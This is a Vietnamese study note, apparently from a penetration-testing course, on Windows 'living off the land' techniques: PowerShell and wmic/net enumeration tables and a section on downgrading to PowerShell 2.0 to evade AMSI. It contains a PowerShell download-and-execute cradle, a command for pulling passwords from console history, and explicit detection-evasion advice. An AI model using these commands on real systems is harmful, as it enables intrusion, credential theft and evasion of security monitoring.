...
# Tổng CMN kết : Living Off the Land
Dài vl má 
Sống dựa trên những thứ sẵn có , không tải tool từ ngoài tránh lộ thông tin hoặc cảnh báo bảo mật 
...
| `Set-ExecutionPolicy Bypass -Scope Process` | Changes the execution policy for the current process only; the policy reverts once the process ends, avoiding permanent changes to the host |
| `Get-ChildItem Env: \| ft Key,Value` | Returns environment values such as key paths, users, and computer information |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Retrieves the user's PowerShell command history, which may contain passwords or references to sensitive configuration files or scripts |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL')"` | Downloads a file from the web and executes it directly in memory using PowerShell |
...
Nó là kiểu hạ cấp powershell 
Hạ cấp PS có khả năng tránh bị phát hiện và vượt qua cơ chế bảo mật 

### Những thứ PowerShell 5.x CÓ nhưng 2.0 KHÔNG CÓ
<img width="601" height="287" alt="image" src="https://github.com/user-attachments/assets/740394c1-8fb1-4564-8720-bd7a3b776537" />

Hacker dùng PS 2.0 để làm gì?
Bypass AMSI
AMSI scan:
- Invoke-Mimikatz
- Invoke-Expression
- payload obfuscated
PS 2.0 không có AMSI
👉 Payload chạy “êm ru”
...
<img width="1163" height="675" alt="image" src="https://github.com/user-attachments/assets/1db74ac5-0a09-4815-b24b-94b1e4cb8e1a" />
...
| `ipconfig /all`                      | Prints out adapter settings for the host. Helps identify the network segment. |
| `route print`                        | Displays the routing table (IPv4 & IPv6), showing known networks and routes. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall and filtering configuration.     |
...
| Command                                         | Description                                                                 |
|------------------------------------------------|-----------------------------------------------------------------------------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patch level and descriptions of applied hotfixes.                |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:list` | Displays basic host information and system attributes.                      |
| `wmic process list /format:list`                | Lists all running processes on the host.                                   |
| `wmic ntdomain list /format:list`               | Displays information about the domain and domain controllers.               |
| `wmic useraccount list /format:list`            | Shows information about all local users and domain users that logged in.    |
| `wmic group list /format:list`                  | Displays information about all local groups.                                |
| `wmic sysaccount list /format:list`             | Dumps information about system/service accounts in use.                     |
...
| Command | Description |
|--------|-------------|
| `net accounts` | Displays local password and account lockout policy. |
...
| `net group "Domain Computers" /domain` | Lists computers joined to the domain. |
| `net group "Domain Controllers" /domain` | Lists domain controller computer accounts. |
| `net group <domain_group_name> /domain` | Lists users belonging to a specific domain group. |
| `net groups /domain` | Lists all domain groups. |
| `net localgroup` | Lists all local groups on the system. |
| `net localgroup administrators /domain` | Lists domain users/groups with local administrator rights. |
...
| `net share` | Displays current shared resources. |
| `net user <ACCOUNT_NAME> /domain` | Displays information about a domain user account. |
| `net user /domain` | Lists all users in the domain. |
| `net user %username%` | Displays information about the currently logged-in user. |
| `net use x: \\computer\share` | Maps a network share to a local drive letter. |
| `net view` | Lists visible computers on the network. |
| `net view /all /domain[:domainname]` | Lists all shares in the specified domain. |
...
### UAC Values
<img width="2576" height="1780" alt="image" src="https://github.com/user-attachments/assets/90eafa00-1201-488a-9512-90ad4057847f" />
